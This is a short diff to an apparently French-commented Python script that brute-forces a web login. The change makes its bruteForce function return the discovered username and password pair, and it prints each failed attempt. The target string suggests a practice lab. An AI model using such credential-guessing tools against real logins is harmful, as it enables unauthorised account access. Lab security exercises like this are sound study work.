@@ -34,14 +34,13 @@ def bruteForce():
             # Vérification de la reponse pour savoir si la combinaison est valide
             if('Welcome to the password protected area' in response):
                 print("\n[✅] Found working credential ! \n\t Username: " + username + "\n\t Password: " + password)
-                return True
-            
+                return [True, [username, password]]
             # Affichage de la tentative en cas d'échec à l'utilisateur
             print("[❌] [" + str(i) + "] Tried with U: " + username + " P: " + password)
 
             # Incrémentation du compteur pour l'affichage
             i += 1
-    return True
+    return [False, ["", ""]]
 
 def bruteRequest(username, password, sessID, url):
     # Ajout de la session ID pour l'authentification
